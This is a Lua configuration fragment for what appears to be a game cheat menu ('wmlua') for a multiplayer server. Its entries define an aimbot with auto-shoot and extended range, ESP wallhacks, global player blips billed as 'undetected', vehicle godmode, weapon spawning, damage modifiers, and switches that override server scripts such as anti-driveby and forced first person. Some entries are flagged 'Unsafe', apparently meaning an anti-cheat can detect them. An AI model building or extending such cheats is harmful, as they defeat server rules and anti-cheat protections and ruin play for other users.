            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Act After, The aimbot will enable itself after shooting x bullets]", tab = "AIM", ctrlType = "button", bind = {9001}, name = "wmlua.V.Aim_changeactafter", label = "Act After 0", func = "wmlua.F.AimChangeActAfter", efunc = wmlua.F.AimChangeActAfter, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Stop After, The aimbot will disable itself after shooting x bullets]", tab = "AIM", ctrlType = "button", bind = {9001}, name = "wmlua.V.Aim_changestopafter", label = "Stop After 0", func = "wmlua.F.AimChangeStopAfter", efunc = wmlua.F.AimChangeStopAfter, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Change Control, The aimbot will enable on a certain keybind]", tab = "AIM", ctrlType = "button", bind = {9001}, name = "wmlua.V.Aim_changecontrol", label = "On Control 21", func = "wmlua.F.AimChangeControl", efunc = wmlua.F.AimChangeControl, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {"Head","Body"}, active = false, advertname = "AIM [Change Bone, Changes the bone the aimbot will shoot at]", tab = "AIM", ctrlType = "selector", bind = {9001}, name = "wmlua.V.Aim_changebone", label = "Hitbox ", func = "wmlua.F.AimChangebone", efunc = wmlua.F.AimChangebone, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Draw FOV, Toggles drawing of the aimbots FOV]", tab = "AIM", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Aim_drawfov", label = "Draw FOV", func = "wmlua.F.Aim_drawfov", efunc = wmlua.F.AimDrawFov, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = true, advertname = "AIM [Visibility Check, Aimbot checks for obstacles before enabling or not]", tab = "AIM", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Aim_vischeck", label = "Visibility Check", func = "wmlua.F.AimVisCheck", efunc = wmlua.F.AimVisCheck, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Auto Shoot, The aimbot will shoot for you]", tab = "AIM", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Aim_autoshoot", label = "Auto Shoot", func = "wmlua.F.AimAutoShoot", efunc = wmlua.F.AimAutoShoot, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = true, advertname = "AIM [Extended Range, The aimbot will extend the range your weapon does damage from]", tab = "AIM", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Aim_extendrange", label = "Extend Range", func = "wmlua.F.AimExtendRange", efunc = wmlua.F.AimExtendRange, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Fast Bullet, Increases the speed at which the bullets travel]", tab = "AIM", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Aim_fastbullet", label = "Fast Bullet", func = "wmlua.F.AimFastBullet", efunc = wmlua.F.AimFastBullet, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = true, advertname = "AIM [Target Players, Will enable the aimbot to act upon players]", tab = "AIM", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Aim_target_player", label = "Target Players", func = "wmlua.F.AimTargetPlayer", efunc = wmlua.F.AimTargetPlayer, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Target NPCs, Will enable the aimbot to act upon Non-Player Characters]", tab = "AIM", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Aim_target_npc", label = "Target NPCs", func = "wmlua.F.AimTargetNpc", efunc = wmlua.F.AimTargetNpc, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Target Animals, Will enable the aimbot to act upon animals]", tab = "AIM", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Aim_target_animal", label = "Target Animals", func = "wmlua.F.AimTargetAnimals", efunc = wmlua.F.AimTargetAnimals, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Draw Crosshair, Toggle drawing of the crosshair on screen]", tab = "AIM", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Aim_drawcrosshair", label = "Draw Crosshair", func = "wmlua.F.AimDrawCrosshair", efunc = wmlua.F.AimDrawCrosshair, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = true, advertname = "AIM [Draw Target, Toggle drawing of the target on screen]", tab = "AIM", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Aim_drawtarget", label = "Draw Target", func = "wmlua.F.AimDrawTarget", efunc = wmlua.F.AimDrawTarget, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Add player to whitelist, Adds desired player to the whitelist]", tab = "AIM", ctrlType = "button", bind = {9001}, name = "wmlua.V.Aim_addwl", label = "Add Player to Whitelist", func = "wmlua.F.AimWhitelistAdd", efunc = wmlua.F.AimWhitelistAdd, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Remove player from whitelist, Removes desired player from the whitelist]", tab = "AIM", ctrlType = "button", bind = {9001}, name = "wmlua.V.Aim_removewl", label = "Remove Player from Whitelist", func = "wmlua.F.AimWhitelistRemove", efunc = wmlua.F.AimWhitelistRemove, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Clear Whitelist, Clears the entire aimbot whitelist]", tab = "AIM", ctrlType = "button", bind = {9001}, name = "wmlua.V.Aim_clearwl", label = "Clear Whitelist", func = "wmlua.F.AimWhitelistClear", efunc = wmlua.F.AimWhitelistClear, MultiTarget = false},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Include Self, see the esp on your self.]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_localtoggle", label = "Include Self", func = "wmlua.F.VISLocalToggle", efunc = wmlua.F.VISLocalToggle, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Log Damage, Logs when damage is taken / given]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_damagetoggle", label = "Log Damage", func = "wmlua.F.VISDamageLog", efunc = wmlua.F.VISDamageToggle, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Always lit, Too dark? Use this.]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_alwayslit", label = "Always Lit", func = "wmlua.F.VISAlwaysLit", efunc = wmlua.F.VISAlwaysLit, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [RGB Glow, Lights up players with a specified color]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_litplayers", label = "RGB Glow", func = "wmlua.F.VISLitPlayers", efunc = wmlua.F.VISLitPlayers, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [2D Boxes, Draws 2d boxes on players within a specified distance]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_2dboxes2", label = "2D Boxes", func = "wmlua.F.VIS2DBoxes2", efunc = wmlua.F.VIS2DBoxes2, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [2D Solid Boxes, Draws 2d boxes on players within a specified distance]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_2dboxes", label = "2D Fill Boxes", func = "wmlua.F.VIS2DBoxes", efunc = wmlua.F.VIS2DBoxes, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Nametags, Draws nametags of players within a specified distance]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_nametags", label = "Nametags", func = "wmlua.F.VISNametags", efunc = wmlua.F.VISNametags, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Line ESP, Draws lines to players within a specified distance]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_lineesp", label = "Line ESP", func = "wmlua.F.VISLineESP", efunc = wmlua.F.VISLineESP, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Proximity ESP, Proximity ESP]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_proximityesp", label = "Proximity ESP", func = "wmlua.F.VISProximityESP", efunc = wmlua.F.VISProximityESP, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Clean Health Bars, Draws hp and armor bars that look very clean]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_cleanhealthbars", label = "Clean Health bars", func = "wmlua.F.VISCleanHealthbars", efunc = wmlua.F.VISCleanHealthbars, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Health Bars, Draws hp and armor]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_healthbars", label = "Health bars", func = "wmlua.F.VISHealthbars", efunc = wmlua.F.VISHealthbars, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [NPC ESP, Draw nametags of npcs within a specified distance]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_npc_esp", label = "NPC ESP", func = "wmlua.F.VISNPCESP", efunc = wmlua.F.VISNPCESP, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Weapon ESP, Draws the weapons of a player within a specified distance]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_weaponesp", label = "Weapon ESP", func = "wmlua.F.VISWeaponESP", efunc = wmlua.F.VISWeaponESP, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [No screen effects, Disables any type of screen effect will be disabled]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_noeffects", label = "No Screen Effects", func = "wmlua.F.VISNoEffects", efunc = wmlua.F.VISNoEffects, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Anti first person, Disables servers from putting you into first person]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_antifirstperson", label = "Anti First Person Only", func = "wmlua.F.VISAntiFirstPerson", efunc = wmlua.F.VISAntiFirstPerson, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Draw HP and Armor, Replaces HP and Armor with an integer showing the amount]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_drawhp", label = "Draw HP and Armor", func = "wmlua.F.VISDrawHP", efunc = wmlua.F.VISDrawHP, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Hide notifications, Disables notifications above your minimap]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_hidenotifications", label = "Hide Notifications", func = "wmlua.F.VISHideNotifications", efunc = wmlua.F.VISHideNotifications, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Big Map, Enlarges the minimap]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_bigmap", label = "Big Map", func = "wmlua.F.VISBigMap", efunc = wmlua.F.VISBigMap, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Draw Talking, Draws text above a talking players head]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_drawtalking", label = "Show Talking", func = "wmlua.F.VISDrawTalking", efunc = wmlua.F.VISDrawTalking, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Draw Impacts, Draws impacts from your gun to the impact]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_impacts", label = "Draw Impacts", func = "wmlua.F.VISImpacts", efunc = wmlua.F.VISImpacts, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Vehicle ESP, Draws nametags of vehicles within a specified distance]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_vehesp", label = "Vehicle ESP", func = "wmlua.F.VISVehESP", efunc = wmlua.F.VISVehESP, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Player Blips, Draws blips on the minimap/map of players globally]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_playerblips", label = "Player Blips", func = "wmlua.F.VISBlips", efunc = wmlua.F.VISBlips, MultiTarget = false, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Safer Player Blips, Draws undetected blips on the minimap of players]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_safeplayerblips", label = "Safer Player Blips", func = "wmlua.F.VISSafeBlips", efunc = wmlua.F.VISSafeBlips, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Heat Seek, Allows you to see people in thermal vision]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_heatseek", label = "Heat Seek", func = "wmlua.F.VISHeatSeek", efunc = wmlua.F.VISHeatSeek, MultiTarget = false, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Draw Coords, Draws your current X,Y,Z Coordinates]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_drawcoords", label = "Draw Coords", func = "wmlua.F.VISDrawCoords", efunc = wmlua.F.VISDrawCoords, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [3D Boxes, Draws 3D boxes on players for better visibility]", tab = "VIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Vis_3dboxes", label = "3D Boxes", func = "wmlua.F.VIS3DBoxes", efunc = wmlua.F.VIS3DBoxes, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {"Normal","Glow","No Fog"}, active = false, advertname = "Visuals [Vision Modifier, Allows you to have Glow or No Fog]", tab = "VIS", ctrlType = "selector", bind = {9001}, name = "wmlua.V.Vis_vision", label = "Vision", func = "wmlua.F.VISVision", efunc = wmlua.F.VISVision, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Visuals [Create Map Blip, Creates a map blip at the specified X,Y,Z Coordinates]", tab = "VIS", ctrlType = "button", bind = {9001}, name = "wmlua.V.Vis_createblip", label = "Create Map Blip", func = "wmlua.F.CreateMapblip", efunc = wmlua.F.CreateMapblip, MultiTarget = false},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Spawn Vehicle, Spawns a vehicle of a desired model]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_vehspawn", label = "Spawn Vehicle", func = "wmlua.F.VEHSpawn", efunc = wmlua.F.VEHSpawn, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Upgrade Vehicle, Fully upgrades vehicle performance]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_upgradevehicle", label = "Upgrade Vehicle Perfomance", func = "wmlua.F.VEHUpgrade", efunc = wmlua.F.VEHUpgrade, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Set Color, Set a custom color of the current vehicle]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_recolorvehicle", label = "Set Color", func = "wmlua.F.VEHRespray", efunc = wmlua.F.VEHRespray, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Refill Boost, Refills the rocket boost of a vehicle]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_refillboost", label = "Refill Vehicle Boost", func = "wmlua.F.VEHRefillBoost", efunc = wmlua.F.VEHRefillBoost, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Fix Vehicle, Fully fixes the your vehicle (in/last)", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_fixvehicle", label = "Fix Vehicle", func = "wmlua.F.VEHFix", efunc = wmlua.F.VEHFix, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Fix Vehicle Engine, Fully fixes your vehicles engine (in/last)]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_fixvehicleengine", label = "Fix Vehicle Engine", func = "wmlua.F.VEHFixEngine", efunc = wmlua.F.VEHFixEngine, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Clean Vehicle, Fully cleans the current vehicle exterior]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_cleanvehicle", label = "Clean Vehicle", func = "wmlua.F.VEHClean", efunc = wmlua.F.VEHClean, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Godmode, Godmodes your current vehicle]", tab = "VEH", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Veh_godmode", label = "Vehicle Godmode", func = "wmlua.F.VEHGodmode", efunc = wmlua.F.VEHGodmode, MultiTarget = false, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Bullet Proof Tires, Prevents your tires from being popped]", tab = "VEH", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Veh_bulletprooftires", label = "Bullet Proof Tires", func = "wmlua.F.VEHBulletProofTires", efunc = wmlua.F.VEHBulletProofTires, MultiTarget = false, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Animated Plate, Displays animated watermalone plate]", tab = "VEH", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Veh_animatedplate", label = "Animated Plate", func = "wmlua.F.VEHAnimatedPlate", efunc = wmlua.F.VEHAnimatedPlate, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Automatic Vehicle Start, Force start the current vehicle]", tab = "VEH", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Veh_enginealwayson", label = "Automatic Start", func = "wmlua.F.VEHEngineAlwaysOn", efunc = wmlua.F.VEHEngineAlwaysOn, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Always Wheelie, Makes your vehicle always prone to do a wheelie]", tab = "VEH", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Veh_alwayswheelie", label = "Always Wheelie", func = "wmlua.F.VEHAlwaysWheelie", efunc = wmlua.F.VEHAlwaysWheelie, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Speed Boost, Temporarily boosts the vehicle with a specified speed]", tab = "VEH", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Veh_speedboost", label = "Speed Boost", func = "wmlua.F.VEHSpeedBoost", efunc = wmlua.F.VEHSpeedBoost, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Super Brake, Increases the stopping power of your vehicle with a specified speed]", tab = "VEH", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Veh_superbrake", label = "Super Brake", func = "wmlua.F.VEHSuperBrake", efunc = wmlua.F.VEHSuperBrake, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Shit Drift Mode, For those who like reduce grip method which is shit imo.]", tab = "VEH", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Veh_shitdriftmode", label = "Shit Drift Mode", func = "wmlua.F.VEHShitDrift", efunc = wmlua.F.VEHShitDrift, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Infinite Fuel, Makes your vehicle's fuel never run out]", tab = "VEH", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Veh_inffuel", label = "Infinite Fuel", func = "wmlua.F.VEHInfFuel", efunc = wmlua.F.VEHInfFuel, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Scorch Vehicle, Makes your vehicle appear burnt to a crisp]", tab = "VEH", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Veh_scorch", label = "Scorch on that whip", func = "wmlua.F.VEHScorch", efunc = wmlua.F.VEHScorch, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Set Nearby Plates, Set a custom license plate on current vehicle]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_setnearbyplates", label = "Set Nearby Plates", func = "wmlua.F.VEHNearbyPlates", efunc = wmlua.F.VEHNearbyPlates, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Unlock Forward Vehicle, Unlocks the vehicle lock in front of the player]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_unlocknearby", label = "Unlock forward Veh", func = "wmlua.F.VEHUnlock", efunc = wmlua.F.VEHUnlock, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [TP Into Front Vehicle, Teleports your character inside of the vehicle infront of your player]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_tpinfront", label = "Teleport Into Forward Vehicle", func = "wmlua.F.VEHTpInfront", efunc = wmlua.F.VEHTpInfront, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Delete front vehicle, Deletes the vehicle infront of your player]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_delinfront", label = "Delete Forward Vehicle", func = "wmlua.F.VEHDelInfront", efunc = wmlua.F.VEHDelInfront, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Apply Drift Handling, Tokyo Drift mode on your vehicle]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_driftmode", label = "Apply Drift Handling", func = "wmlua.F.VEHDrift", efunc = wmlua.F.VEHDrift, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Set Handling, Set a handling field of your vehicle]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_sethandling", label = "Set Handling", func = "wmlua.F.VEHSetHandling", efunc = wmlua.F.VEHSetHandling, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Set Power, Sets your vehicle's power]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_setpower", label = "Modify Power 1", func = "wmlua.F.VEHPower", efunc = wmlua.F.VEHPower, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Unflip Vehicle, Unflips your vehicle..]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_unflip", label = "Unflip Vehicle", func = "wmlua.F.VEHUnflip", efunc = wmlua.F.VEHUnflip, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Vehicle [Los Melon Customs, Allows you to modify your vehicle]", tab = "VEH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Veh_lms", label = "Los Melon Customs", func = "wmlua.F.VEHLMS", efunc = wmlua.F.VEHLMS, MultiTarget = false},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "", tab = "LSC", ctrlType = "button", bind = {9001}, name = "wmlua.V.LSC_refreshmods", label = "Refresh", func = "wmlua.F.LSCRefresh", efunc = wmlua.F.LSCRefresh, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Los Melon Customs [Toggle Turbo]", tab = "LSC", ctrlType = "button", bind = {9001}, name = "wmlua.V.LSC_changeturbo", label = "Turbo 1 of 0", func = "wmlua.F.LSCTurbo", efunc = wmlua.F.LSCTurbo, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Los Melon Customs [Change Engine Level]", tab = "LSC", ctrlType = "button", bind = {9001}, name = "wmlua.V.LSC_changeengine", label = "Engine 1 of 0", func = "wmlua.F.LSCEngine", efunc = wmlua.F.LSCEngine, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Los Melon Customs [Change Brakes Level]", tab = "LSC", ctrlType = "button", bind = {9001}, name = "wmlua.V.LSC_changebrakes", label = "Brakes 1 of 0", func = "wmlua.F.LSCBrakes", efunc = wmlua.F.LSCBrakes, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Los Melon Customs [Change Transmission Level]", tab = "LSC", ctrlType = "button", bind = {9001}, name = "wmlua.V.LSC_changetransmission", label = "Transmission 1 of 0", func = "wmlua.F.LSCTransmission", efunc = wmlua.F.LSCTransmission, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Los Melon Customs [Change Suspension Level]", tab = "LSC", ctrlType = "button", bind = {9001}, name = "wmlua.V.LSC_changesuspension", label = "Suspension 1 of 0", func = "wmlua.F.LSCSuspension", efunc = wmlua.F.LSCSuspension, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Los Melon Customs [Change Armor Level]", tab = "LSC", ctrlType = "button", bind = {9001}, name = "wmlua.V.LSC_changearmor", label = "Armor 1 of 0", func = "wmlua.F.LSCArmor", efunc = wmlua.F.LSCArmor, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Los Melon Customs [Change Front Bumper]", tab = "LSC", ctrlType = "button", bind = {9001}, name = "wmlua.V.LSC_changefrontbumper", label = "Front Bumper 1 of 0", func = "wmlua.F.LSCFrontBumper", efunc = wmlua.F.LSCFrontBumper, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Los Melon Customs [Change Rear Bumper]", tab = "LSC", ctrlType = "button", bind = {9001}, name = "wmlua.V.LSC_changerearbumper", label = "Rear Bumper 1 of 0", func = "wmlua.F.LSCRearBumper", efunc = wmlua.F.LSCRearBumper, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Los Melon Customs [Change Side Skirt]", tab = "LSC", ctrlType = "button", bind = {9001}, name = "wmlua.V.LSC_changesideskirt", label = "Side Skirt 1 of 0", func = "wmlua.F.LSCSideSkirt", efunc = wmlua.F.LSCSideSkirt, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Los Melon Customs [Change Spoiler]", tab = "LSC", ctrlType = "button", bind = {9001}, name = "wmlua.V.LSC_changespoiler", label = "Spoiler 1 of 0", func = "wmlua.F.LSCSpoiler", efunc = wmlua.F.LSCSpoiler, MultiTarget = false},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Weapon [Spawn Weapon, Spawns a specific weapon in your inventory]", tab = "WEP", ctrlType = "button", bind = {9001}, name = "wmlua.V.Wep_spawnwep", label = "Spawn Weapon", func = "wmlua.F.WEPSpawnWep", efunc = wmlua.F.WEPSpawnWep, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Weapon [Remove Weapon, Remove a specific weapon from your inventory]", tab = "WEP", ctrlType = "button", bind = {9001}, name = "wmlua.V.Wep_removewep", label = "Remove Weapon", func = "wmlua.F.WEPRemoveWep", efunc = wmlua.F.WEPRemoveWep, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Weapon [Spawn All Weapons, Spawns all the weapons in your inventory]", tab = "WEP", ctrlType = "button", bind = {9001}, name = "wmlua.V.Wep_spawnallweps", label = "Spawn All Weapons", func = "wmlua.F.WEPSpawnAllWeps", efunc = wmlua.F.WEPSpawnAllWeps, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Weapon [Remove All Weapons, Removes all the weapons from your inventory]", tab = "WEP", ctrlType = "button", bind = {9001}, name = "wmlua.V.Wep_removeallweps", label = "Remove All Weapons", func = "wmlua.F.WEPRemoveAllWeps", efunc = wmlua.F.WEPRemoveAllWeps, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Weapon [Damage Modifier, Modifies the bullet damage of the weapons]", tab = "WEP", ctrlType = "button", bind = {9001}, name = "wmlua.V.Wep_dmgmod", label = "Damage Modifier 0", func = "wmlua.F.WEPDamageModifier", efunc = wmlua.F.WEPDamageModifier, MultiTarget = false, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Weapon [Disable Anti Driveby, Prevents servers preventing you from doing a driveby]", tab = "WEP", ctrlType = "button", bind = {9001}, name = "wmlua.V.Wep_disableantidriveby", label = "Disable anti driveby", func = "wmlua.F.WEPAllowDriveBy", efunc = wmlua.F.WEPAllowDriveBy, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Weapon [Anti Holster Script, Removes the scripted holster animation from servers]", tab = "WEP", ctrlType = "button", bind = {9001}, name = "wmlua.V.Wep_antiholsterscript", label = "Anti Holster Script", func = "wmlua.F.WEPAntiScriptedHolster", efunc = wmlua.F.WEPAntiScriptedHolster, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Weapon [Anti Scripted Recoil, Removes the recoil effect from those 'recoil' scripts]", tab = "WEP", ctrlType = "button", bind = {9001}, name = "wmlua.V.Wep_antiscriptedrecoil", label = "Anti Scripted Recoil", func = "wmlua.F.WEPAntiScriptedRecoil", efunc = wmlua.F.WEPAntiScriptedRecoil, MultiTarget = false},
